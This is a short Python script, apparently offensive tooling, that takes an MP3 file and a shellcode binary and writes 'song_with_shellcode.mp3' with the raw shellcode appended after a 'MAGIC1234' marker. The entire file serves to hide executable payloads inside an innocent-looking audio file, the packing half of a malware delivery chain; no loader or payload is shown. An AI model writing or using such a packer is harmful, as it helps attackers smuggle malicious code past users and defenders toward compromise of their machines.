import sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} input.mp3 shellcode.bin")
    sys.exit(1)

mp3_file = sys.argv[1]
sc_file  = sys.argv[2]

mp3_data = open(mp3_file, "rb").read()
shellcode = open(sc_file, "rb").read()

with open("song_with_shellcode.mp3", "wb") as f:
    f.write(mp3_data)
    f.write(b"MAGIC1234")
    f.write(shellcode)

print(f"[+] Embedded {len(shellcode)} bytes of raw shellcode into song_with_shellcode.mp3")
